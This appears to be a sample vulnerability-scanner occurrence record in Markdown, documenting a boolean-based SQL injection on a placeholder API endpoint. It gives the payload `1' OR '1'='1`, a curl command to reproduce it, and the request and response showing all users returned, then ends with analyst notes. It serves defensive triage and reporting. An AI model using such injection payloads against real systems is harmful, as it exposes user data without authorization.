---
occurrenceId: occ-a1b2c3d4
findingId: fin-d1a7e8b9
definitionId: def-40018
pluginId: "40018"
name: "GET /api/v1/users?id=1' OR '1'='1"
url: "https://my-app.com/api/v1/users"
method: "GET"
param: "id"
attack: "1' OR '1'='1"
evidence: "boolean-based payload altered query logic (returned full user list)"
risk: "High"
riskcode: "3"
confidence: "Medium"
sourceid: ""
scan:
  label: "Run 2025-08-19"
domain:
  label: "my-app"
analyst:
  status: "open"
---

# SQL Injection occurrence: boolean-based

> [!summary]
> - Finding: [[sample-sqli-finding|SQL Injection - /api/v1/users]]
> - Param: `id`
> - Attack: `1' OR '1'='1`
> - Evidence: boolean-based SQLi (query returned more rows)
> - Status: open

## Reproduce
```bash
curl -sS "https://my-app.com/api/v1/users?id=1%27%20OR%20%271%27=%271" -H "Accept: application/json"
```

## Traffic

### Request
```
GET /api/v1/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1
Host: my-app.com
User-Agent: ZAP
Accept: application/json
```

### Response
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache

[
  {"id":1,"name":"admin"},
  {"id":2,"name":"alice"},
  {"id":3,"name":"bob"}
]
```

## Investigate

> [!NOTE] Analyst Notes

> Reviewing the request the injection appears in the users.id value. The return traffic shows three users returned by query which indicates succesful SQLi. 




